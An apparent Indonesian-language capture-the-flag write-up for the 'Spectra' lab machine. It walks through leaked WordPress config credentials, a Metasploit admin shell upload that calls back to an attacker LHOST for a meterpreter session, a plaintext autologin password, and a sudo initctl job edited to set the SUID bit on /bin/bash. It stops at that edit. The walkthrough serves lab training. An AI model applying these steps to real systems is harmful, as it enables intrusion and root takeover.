# Spectra Writeup

Pertama dari website terlihat dua pilihan ke website utama atau testing. Dari website utama diketahui menggunakan wordpress. Namun jika tidak bisa membuak websitenya maka perlu menambahakan `10.10.10.229 spectra.htb` pada `/etc/hosts`. Setelahnya website bisa dibuat normal.

Pada website testing terdapat misconfiguration mengenai directory pada wordpress. Ketika dicek terdapat file wp-config.php.save yang jika kita curl bisa mendapatkan credentials untuk loginnya.

cred :
```php
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );
```

Selanjutnya coba login ke /main/wp-admin/ dengan credential yang sama namun tidak bisa. Sekarang coba dengan username `administrator` ternyata bisa. Selanjutnya bisa mencari cve karena memang versi wordpress sudah tua biasanya ada cve yang bisa digunakan. Kita coba dengan msfconsole untuk mendapatkan meterpreter. 

```
msf6 > search wp admin

Matching Modules
================

   #   Name                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                      ---------------  ----       -----  -----------
   0   auxiliary/gather/alienvault_newpolicyform_sqli            2014-05-09       normal     No     AlienVault Authenticated SQL Injection Arbitrary File Read
   1   auxiliary/scanner/http/gavazzi_em_login_loot                               normal     No     Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database
   2   auxiliary/admin/netbios/netbios_spoof                                      normal     No     NetBIOS Response Brute Force Spoof (Direct)
   3   auxiliary/admin/sap/sap_configservlet_exec_noauth         2012-11-01       normal     No     SAP ConfigServlet OS Command Execution
   4   auxiliary/admin/sap/cve_2020_6207_solman_rce              2020-10-03       normal     No     SAP Solution Manager remote unauthorized OS commands execution
   5   exploit/multi/sap/cve_2020_6207_solman_rs                 2020-10-03       normal     Yes    SAP Solution Manager remote unauthorized OS commands execution
   6   exploit/multi/http/sonicwall_gms_upload                   2012-01-17       excellent  Yes    SonicWALL GMS 6 Arbitrary File Upload
   7   exploit/linux/http/sophos_wpa_iface_exec                  2014-04-08       excellent  No     Sophos Web Protection Appliance Interface Authenticated Arbitrary Command Execution
   8   auxiliary/admin/http/sophos_wpa_traversal                 2013-04-03       normal     No     Sophos Web Protection Appliance patience.cgi Directory Traversal
   9   exploit/windows/local/wmi_persistence                     2017-06-06       normal     No     WMI Event Subscription Persistence
   10  exploit/unix/webapp/wp_admin_shell_upload                 2015-02-21       excellent  Yes    WordPress Admin Shell Upload
```

Kemudian `use 10` kita akan menggunakan nya untuk mendapatkan shell dari cred admin yang kita punya. Kita atur option untuk exploitnya seperti dibawah, dan berhasil mendapat metrperter.

```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD devteam01
PASSWORD => devteam01
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME administrator
USERNAME => administrator
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 10.10.10.229
RHOSTS => 10.10.10.229
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set LHOST 10.10.16.17
LHOST => 10.10.16.17
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /main
TARGETURI => /main

```

Kita sekarang login sebagai nginx. Ketika menjelajahi folder home kita menemukan banyak user, dan terntaya flag user terdapat pada katie. Selanjutnya kita menjelajah lagi dan membuka file /opt/autologin.conf.fig didalamnya:

```sh
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi
```

Dari sini kita bisa `cat /opt/autologin` dan didapatkan password `SummerHereWeCome!!`. Konek menggunakan ssh sebagi katie dan mendapatkan flag user :e89d27fe195e9114ffa72ba8913a6130.


Selanjutnya priviledge escalation kita cek sudo -l hasilnya

```
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```

cek service apa yang berjalan `/sbin/initctl list` dan terdapat beberapa service custom yaitu test dan test1. File yang tedapat di list tersebut ada dalam folder /etc/init. Sekarang kita edit /etc/init/test.conf menjadi:

```
description "Test node.js server"
author      "katie"

script
    chmod +s /bin/bash
end script
```